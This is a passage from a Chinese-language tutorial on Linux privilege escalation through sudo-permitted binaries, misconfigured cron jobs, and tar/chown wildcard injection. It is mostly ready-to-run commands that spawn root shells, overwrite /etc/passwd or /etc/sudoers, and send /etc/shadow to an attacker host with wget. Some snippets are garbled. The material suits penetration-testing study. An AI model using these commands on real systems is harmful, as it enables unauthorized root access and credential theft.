+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">root ALL=(ALL) ALL<br><span class="hljs-comment">#说明1:root用户可以从 ALL终端作为 ALL（任意）用户执行，并运行 ALL（任意）命令。</span><br><span class="hljs-comment">#第一部分是用户，第二部分是用户可以在其中使用sudo命令的终端，第三部分是他可以充当的用户，最后一部分是他在使用时可以运行的命令。sudo</span><br><br>touhid ALL= /sbin/poweroff<br><span class="hljs-comment">#说明2:以上命令，使用户可以从任何终端使用touhid的用户密码关闭命令电源。</span><br><br>touhid ALL = (root) NOPASSWD: /usr/bin/find<br><span class="hljs-comment">#说明3:上面的命令，使用户可以从任何终端运行，以root用户身份运行命令find 而无需密码。</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="对sudo账户的利用"><a href="#对sudo账户的利用" class="headerlink" title="对sudo账户的利用"></a>对sudo账户的利用</h3><p>要利用sudo用户，您需要找到您必须允许的命令。<br>sudo -l</p>
+<p>上面的命令显示了允许当前用户使用的命令。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/67b98c2f3dc04bfba3e90b52a4ffd4d7.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>此处sudo -l，显示用户已允许以root用户身份执行所有此二进制文件而无需密码。</p>
+<p>让我们一一查看所有二进制文件（仅在索引中提到）和将<strong>特权</strong>提升给<strong>root</strong>用户。</p>
+<h4 id="find命令利用"><a href="#find命令利用" class="headerlink" title="find命令利用"></a>find命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo find /etc/passwd -<span class="hljs-built_in">exec</span> /bin/sh \;<br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo find /bin -name nano -<span class="hljs-built_in">exec</span> /bin/sh \;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Vim命令利用"><a href="#Vim命令利用" class="headerlink" title="Vim命令利用"></a>Vim命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim -c <span class="hljs-string">&#x27;!sh&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="Nmap命令利用"><a href="#Nmap命令利用" class="headerlink" title="Nmap命令利用"></a>Nmap命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#老版本nmap</span><br>sudo nmap --interactive <span class="hljs-comment">#交互式</span><br>&gt;!sh<br><br><br><span class="hljs-comment">#新版本nmap，需要nmap以root运行</span><br><span class="hljs-built_in">cat</span> os.execute(<span class="hljs-string">&quot;/bin/sh&quot;</span>) &gt; nse_root.nse<br><span class="hljs-comment">#nse是nmap的插件扩展名</span><br>nmap --script=/home/jens/nse_root.nse<br></code></pre></td></tr></table></figure>
+
+<h4 id="Man命令利用"><a href="#Man命令利用" class="headerlink" title="Man命令利用"></a>Man命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo man man<br><span class="hljs-comment">#之后按!按下并按Enter</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="less-x2F-more命令利用"><a href="#less-x2F-more命令利用" class="headerlink" title="less&#x2F;more命令利用"></a>less&#x2F;more命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo less /etc/hosts<br><br>sudo more /etc/hosts<br><br>之后按!按下并按Enter<br></code></pre></td></tr></table></figure>
+<h4 id="awk命令利用"><a href="#awk命令利用" class="headerlink" title="awk命令利用"></a>awk命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+<h4 id="nano命令利用"><a href="#nano命令利用" class="headerlink" title="nano命令利用"></a>nano命令利用</h4><p>nano是文本编辑器，在您需要切换用户之后，您可以修改passwd文件并将用户添加为root特权。在&#x2F;etc &#x2F;passwd中添加此行，以将用户添加为root特权。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">touhid:$ 6 $ bxwJfzor<span class="hljs-variable">$MUhUWO0MUgdkWfPPEydqgZpm</span>.YtPMI / gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin<br><br>sudo nano /etc/passwd<br><br><span class="hljs-comment">#现在切换用户，密码是test</span><br>su touhid<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="wget命令利用"><a href="#wget命令利用" class="headerlink" title="wget命令利用"></a>wget命令利用</h4><p>这种方式要求Web服务器下载文件。流程如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.首先将目标机的/etc/passwd文件复制到攻击者计算机。<br>2.修改文件，并在上一步中保存的密码文件中添加用户到攻击者计算机。<br>3.仅附加此行=&gt;  touhid:$ 6 $ bxwJfzor $ MUhUWO0MUgdkWfPPEydqgZpm.YtPMI / gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0 / 0:b:root/root:<br>4.将passwd文件托管到使用任何Web服务器的主机。<br></code></pre></td></tr></table></figure>
+<p>在目标机器上执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p>现在切换用户，密码是test</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su touhid<br></code></pre></td></tr></table></figure>
+
+<p>从服务器上转储文件，例如root的ssh密钥，shadow文件等的命令如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo wget  --post-file = /etc/shadow 192.168.56.1:8080<br></code></pre></td></tr></table></figure>
+
+<p>攻击机使用nc监听端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc –lvp 8080<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="apache命令利用"><a href="#apache命令利用" class="headerlink" title="apache命令利用"></a>apache命令利用</h4><p>无法通过这种方式获得写权限和Shell，但是使用它我们可以查看系统文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apache2 -f /etc/shadow<br></code></pre></td></tr></table></figure>
+<p>输出</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Syntax</span> error <span class="hljs-literal">on</span> line <span class="hljs-number">1</span> of /etc/shadow:Invalid command &#x27;root:$<span class="hljs-number">6</span>$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:<span class="hljs-number">17298</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::&#x27;, perhaps misspelled or defined by a module not included in the server configuration<br></code></pre></td></tr></table></figure>
+
+<p>我们可以现在提取root哈希并尝试破解。</p>
+<h4 id="cp命令利用"><a href="#cp命令利用" class="headerlink" title="cp命令利用"></a>cp命令利用</h4><p>覆盖 &#x2F;etc&#x2F;shadow 或 &#x2F;etc&#x2F;passwd</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>cat /etc/passwd &gt;passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>openssl passwd <span class="hljs-number">-1</span> -salt hack hack123<span class="hljs-variable">$1</span><span class="hljs-variable">$hack</span><span class="hljs-variable">$WTn0dk2QjNeKfl</span>.<span class="hljs-title class_">DHOUue0</span>[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash&#x27;</span> &gt;&gt; passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>cp passwd /etc/passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>su - <span class="hljs-symbol">hackPassword:</span>[root<span class="hljs-variable">@361way</span> ~]<span class="hljs-comment"># iduid=0(hack) gid=0(root) groups=0(root)[root@361way ~]# cat /etc/passwd|tail -1hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="mv命令利用"><a href="#mv命令利用" class="headerlink" title="mv命令利用"></a>mv命令利用</h4><p>覆盖 &#x2F;etc&#x2F;shadow 或 &#x2F;etc&#x2F;passwd</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>cat /etc/passwd &gt;passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>openssl passwd <span class="hljs-number">-1</span> -salt hack hack123<span class="hljs-variable">$1</span><span class="hljs-variable">$hack</span><span class="hljs-variable">$WTn0dk2QjNeKfl</span>.<span class="hljs-title class_">DHOUue0</span>[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash&#x27;</span> &gt;&gt; passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>mv passwd /etc/passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>su - <span class="hljs-symbol">hackPassword:</span>[root<span class="hljs-variable">@361way</span> ~]<span class="hljs-comment"># iduid=0(hack) gid=0(root) groups=0(root)[root@361way ~]# cat /etc/passwd|tail -1hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="python-x2F-perl-x2F-ruby-x2F-lua-x2F-php-x2F-etc命令利用"><a href="#python-x2F-perl-x2F-ruby-x2F-lua-x2F-php-x2F-etc命令利用" class="headerlink" title="python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc命令利用"></a>python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc命令利用</h4><p><strong>python</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>perl</strong></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">exec <span class="hljs-string">&quot;/bin/bash&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+<h2 id="0x07-Linux提权-利用定时任务（Cron-jobs）"><a href="#0x07-Linux提权-利用定时任务（Cron-jobs）" class="headerlink" title="0x07 Linux提权-利用定时任务（Cron jobs）"></a>0x07 Linux提权-利用定时任务（Cron jobs）</h2><p>如果未正确配置Cronjob，则可以利用该Cronjob获得root特权。</p>
+<p>\1. Cronjob中是否有可写的脚本或二进制文件？<br>2.我们可以覆盖cron文件本身吗？<br>\3. cron.d目录可写吗？</p>
+<p>Cronjob通常以root特权运行。如果我们可以成功篡改cronjob中定义的任何脚本或二进制文件，那么我们可以以root权限执行任意代码。</p>
+<h3 id="Cronjob简介"><a href="#Cronjob简介" class="headerlink" title="Cronjob简介"></a>Cronjob简介</h3><p>Cron Jobs被用于通过在服务器上的特定日期和时间执行命令来安排任务。它们最常用于sysadmin任务，如备份或清理&#x2F;tmp&#x2F;目录等。Cron这个词来自crontab，它存在于&#x2F;etc目录中。</p>
+<p>例如:在crontab内部，我们可以添加以下条目，以每1小时自动打印一次apache错误日志。</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">0</span> * * * printf “” &gt; /var/<span class="hljs-keyword">log</span>/apache/error_log<br></code></pre></td></tr></table></figure>
+
+<p>前五个数字值表示执行cronjob的时间。现在让我们了解五个数字值。</p>
+<ul>
+<li>分钟–第一个值表示介于0到59之间的分钟范围，而*表示任何分钟。</li>
+<li>小时–第二个值表示小时范围在0到24之间，*表示任何小时。</li>
+<li>月中的某天–第三个值表示月中的某日，范围是1到31，*表示任何一天。</li>
+<li>月–第四个值表示1到12之间的月份范围，*表示任何月份。</li>
+<li>星期几–第五个值表示从星期天开始的星期几，介于0到6之间，*表示星期几。</li>
+</ul>
+<h3 id="Cron提权概述"><a href="#Cron提权概述" class="headerlink" title="Cron提权概述"></a>Cron提权概述</h3><p>cron守护程序计划在指定的日期和时间运行命令。它与特定用户一起运行命令。因此，我们可以尝试使用它进行提权。</p>
+<p><strong>Cron信息收集</strong></p>
+<p>收集信息的基本命令，寻找是否能够使用错误配置的cron实现提权。</p>
+<table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>结果</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>crontab -l</td>
+<td>显示当前用户的cron</td>
+</tr>
+<tr>
+<td>ls -la &#x2F;etc&#x2F;cron*</td>
+<td>显示计划的作业概述</td>
+</tr>
+</tbody></table>
+<p><strong>查找特权用户拥有且可写的任何内容:</strong></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle">crontab -l<br>ls -alh <span class="hljs-regexp">/var/</span>spool/cron<br>ls -al <span class="hljs-regexp">/etc/</span> | <span class="hljs-keyword">grep</span> cron<br>ls -al <span class="hljs-regexp">/etc/</span>cron*<br>cat <span class="hljs-regexp">/etc/</span>cron*<br>cat <span class="hljs-regexp">/etc/</span>at.allow<br>cat <span class="hljs-regexp">/etc/</span>at.deny<br>cat <span class="hljs-regexp">/etc/</span>cron.allow<br>cat <span class="hljs-regexp">/etc/</span>cron.deny<br>cat <span class="hljs-regexp">/etc/</span>crontab<br>cat <span class="hljs-regexp">/etc/</span>anacrontab<br>cat <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs/root<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>查看其他用户的crontab</strong></p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$ crontab -u tstark -l0 <span class="hljs-number">0</span> * * * <span class="hljs-regexp">/ jarvis /</span> reboot-arc-reactor<br></code></pre></td></tr></table></figure>
+
+
+
+<p>如果服务器上有很多用户，那么可以在<a target="_blank" rel="noopener" href="https://cronitor.io/cron-reference/where-are-cron-logs-stored">cron日志中</a>看到详细信息，可能包含用户名。</p>
+<p>例如，在这里我可以看到运行数据库备份脚本的ubuntu用户:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>月<span class="hljs-number">5</span>日<span class="hljs-number">4</span>:<span class="hljs-number">05</span>:<span class="hljs-number">01</span> dev01 CRON<span class="hljs-meta"> [2128]:（ubuntu）CMD（/var/cronitor/database-backup.sh）</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>使用pspy工具（32位为pspy32，64位为pspy64）。</strong></p>
+<p>下载链接:<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">https</a>:<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">&#x2F;&#x2F;github.com&#x2F;DominicBreuker&#x2F;pspy</a></p>
+<p><strong>利用配置错误的cronjob获得root访问权限</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -la /etc/cron.d <span class="hljs-comment">#输出cron.d中已经存在的cronjob</span><br><br>find / -perm -2 -<span class="hljs-built_in">type</span> f 2&gt; /dev/null <span class="hljs-comment">#输出可写文件</span><br><br><span class="hljs-built_in">ls</span> -la /usr/local/sbin/cron-logrotate.sh <span class="hljs-comment">#让我们确认cron-logrotate.sh是否可写。</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>如果我们知道cron-lograte.sh是可写的，它由logrotate cronjob运行。</p>
+<p>那么我们在cron-lograte.sh中编写&#x2F;附加的任何命令都将以root身份执行。</p>
+<p>我们在&#x2F;tmp目录中编写一个C文件并进行编译。</p>
+<p>rootme可执行文件将生成一个shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -la rootme <span class="hljs-comment">#它告诉我们它是由用户&#x27;SHayslett&#x27;拥有的</span><br><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chown root:root /tmp/rootme; chmod u + s /tmp/rootme;&quot;</span> &gt;/usr/local/sbin/cron-logrotate.sh <span class="hljs-comment">#这将更改可执行文件的所有者和组为root。它还将设置SUID位。</span><br><br>$ <span class="hljs-built_in">ls</span> -la rootme <span class="hljs-comment">#5分钟后，运行了logrotate cronjob，并以root特权执行了cron-logrotate.sh。</span><br><br>$ ./rootme <span class="hljs-comment">#生成一个root shell。</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Cron脚本覆盖和符号链接"><a href="#Cron脚本覆盖和符号链接" class="headerlink" title="Cron脚本覆盖和符号链接"></a>Cron脚本覆盖和符号链接</h3><h4 id="修改以root权限运行的cron脚本获得shell"><a href="#修改以root权限运行的cron脚本获得shell" class="headerlink" title="修改以root权限运行的cron脚本获得shell"></a>修改以root权限运行的cron脚本获得shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; &lt;/PATH/CRON/SCRIPT&gt; #Wait until it is executed/tmp/bash -p＃等待执行<br><br>/tmp/bash -p<br></code></pre></td></tr></table></figure>
+
+<p>如果root用户执行的脚本使用<strong>具有完全访问权限</strong>的<strong>目录</strong>，则删除该文件夹并<strong>创建一个符号链接文件夹到</strong>攻击者可控的脚本的文件夹。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -d -s &lt;/PATH/TO/POINT &gt; &lt;/PATH/CREATE/FOLDER&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p>可以监视进程以搜索每1,2或5分钟执行的进程。可以利用它提权。</p>
+<p>例如，要<strong>在1分钟内每隔0.1s监视一次</strong>，<strong>按执行次数较少的命令排序</strong>并删除一直执行的命令，可以执行以下操作:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 610); <span class="hljs-keyword">do</span> ps -e --format cmd &gt;&gt; /tmp/monprocs.tmp; <span class="hljs-built_in">sleep</span> 0.1; <span class="hljs-keyword">done</span>; <span class="hljs-built_in">sort</span> /tmp/monprocs.tmp | <span class="hljs-built_in">uniq</span> -c | grep -v <span class="hljs-string">&quot;\[&quot;</span> | sed <span class="hljs-string">&#x27;/^.\&#123;200\&#125;./d&#x27;</span> | <span class="hljs-built_in">sort</span> | grep -E -v <span class="hljs-string">&quot;\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]&quot;</span>; <span class="hljs-built_in">rm</span> /tmp/monprocs.tmp;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>总结</strong></p>
+<p>由于Cron在执行时以root身份运行&#x2F;etc&#x2F;crontab，因此crontab调用的任何命令或脚本也将以root身份运行。当Cron执行的脚本可由非特权用户编辑时，那些非特权用户可以通过编辑此脚本并等待Cron以root特权执行该脚本来提升其特权!</p>
+<p>例如，假设下面的行在中&#x2F;etc&#x2F;crontab。每天晚上9:30，Cron运行maintenance.sh shell脚本。该脚本在root特权下运行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">30 21 * * * root /path/to/maintenance.sh<br></code></pre></td></tr></table></figure>
+
+<p>这使得提权变得十分简单。例如，攻击者可以通过将自己添加为sudoer来向自己授予超级用户特权。</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;vickie ALL=(ALL) NOPASSWD:ALL&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>sudoers<br></code></pre></td></tr></table></figure>
+
+<p>或者，他们可以通过将新的root用户添加到“ &#x2F;etc &#x2F;passwd”文件来获得root访问权限。由于“ 0”是root用户的UID，因此添加UID为“ 0”的用户将为该用户提供root特权。该用户的用户名为“ vickie”，密码为空:</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;vickie::0:0:System Administrator:/root/root:/bin/bash&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>
+
+<p>等等。</p>
+<h2 id="0x08-Linux提权-通配符注入"><a href="#0x08-Linux提权-通配符注入" class="headerlink" title="0x08 Linux提权-通配符注入"></a>0x08 Linux提权-通配符注入</h2><p>通配符是代表其他字符的符号。您可以将它们与任何命令（例如cat或rm命令）一起使用，以列出或删除符合给定条件的文件。还有其他一些，但是现在对我们很重要的一个是*字符，它可以匹配任意数量的字符。</p>
+<p>例如:</p>
+<ul>
+<li>cat * 显示当前目录中所有文件的内容</li>
+<li>rm * 删除当前目录中的所有文件</li>
+</ul>
+<p>它的工作原理是将*角色扩展到所有匹配的文件。如果我们有文件a，b，c在当前目录中并运行rm *，则结果为rm a b c。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>众所周知，我们可以在命令行中将标志传递给程序以指示其应如何运行。例如，如果我们使用rm -rf而不是，rm那么它将递归并强制删除文件，而无需进一步提示。</p>
+<p>现在，如果我们运行<code>rm *</code>并在当前目录中有一个名为name的文件<code>*</code>将导致命令变为，rm -rf a b c。</p>
+<p>当特权用户或脚本在具有潜在危险标志的命令中使用通配符，尤其是与外部命令执行相关的通配符时，我们可能会使用它来升级特权。</p>
+<h3 id="chown和chmod"><a href="#chown和chmod" class="headerlink" title="chown和chmod"></a>chown和chmod</h3><p>chown和chmod都可以用相同的方式利用，因此我只看看chown。</p>
+<p>Chown是一个程序，可让您更改指定文件的所有者。以下示例将some-file.txt的所有者更改为some-user:</p>
+<p>chown some-user some-file.txt</p>
+<p>Chown具有一个–reference&#x3D;some-reference-file标志，该标志指定文件的所有者应与参考文件的所有者相同。一个例子应该有帮助:</p>
+<p>chown some-user some-file.txt –reference&#x3D;some-reference-file</p>
+<p>假设的所有者some-reference-file是another-user。在这种情况下，所有者some-file.txt将another-user代替some-user。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>假设我们有一个名为弱势程序的脆弱程序，其中包含以下内容:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> some-directory<br><span class="hljs-built_in">chown</span> root *<br></code></pre></td></tr></table></figure>
+
+<p>在这种情况下，让我们创建一个我们拥有的文件:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> some-directory <br><span class="hljs-built_in">touch</span> reference<br></code></pre></td></tr></table></figure>
+
+<p>然后我们创建一个文件，并注入标记:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> -- --reference=reference<br></code></pre></td></tr></table></figure>
+<p>如果在同一目录中创建到&#x2F;etc&#x2F;passwd的符号链接，则&#x2F;etc&#x2F;passwd的所有者也将是您，这将使您获得root shell。</p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="TAR"><a href="#TAR" class="headerlink" title="TAR"></a>TAR</h4><p>Tar是一个程序，可让您将文件收集到存档中。</p>
+<p>在tar中，有checkpoint标志，这些标志使您可以在归档指定数量的文件后执行操作。由于我们可以使用通配符注入来注入那些标志，因此我们可以使用checkpoint点来执行我们选择的命令。如果tar以root用户身份运行，则命令也将以root用户身份运行。</p>
+<p>鉴于存在此漏洞，获得root权限的一种简单方法利用sudoer，这将在下面进行说明。</p>
+<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>假设我们有一个易受攻击的程序，并且使用cron定期运行该程序。该程序包含以下内容:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> important-directory<br>tar cf /var/backups/backup.tar *<br></code></pre></td></tr></table></figure>
+
+
+
+<p>进行根访问的步骤如下:</p>
+<p><strong>1）注入一个标志来指定我们的checkpoint</strong></p>
+<p>首先，我们将指定在归档一个文件之后，有一个检查点。稍后我们将对该检查点执行操作，但是现在我们仅告诉tar它存在。</p>
+<p>让我们创建一个将注入标记的文件:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> important-directory<br><span class="hljs-built_in">touch</span> -- --checkpoint=1 <span class="hljs-comment">#--可以将后面的--checkpoint=1视作创建的文件名而不是选项（如--help）原因未明</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>2）编写恶意的Shell脚本</strong></p>
+<p>Shell脚本更改sudoers进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;echo &quot;my-user ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; demo.sh<br></code></pre></td></tr></table></figure>
+
+<p>Shell脚本应与通配符位于同一目录中。</p>
+<p>请注意，我们将必须更改my-user为要成为sudoer的实际用户。</p>
+<p><strong>3）注入一个指定检查点动作的标志</strong></p>
+<p>现在，我们将指定，当tar到达在步骤＃1中指定的检查点时，它应运行在步骤＃2中创建的shell脚本:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> -- <span class="hljs-string">&quot;--checkpoint-action=exec=sh demo.sh&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>4）root</strong></p>
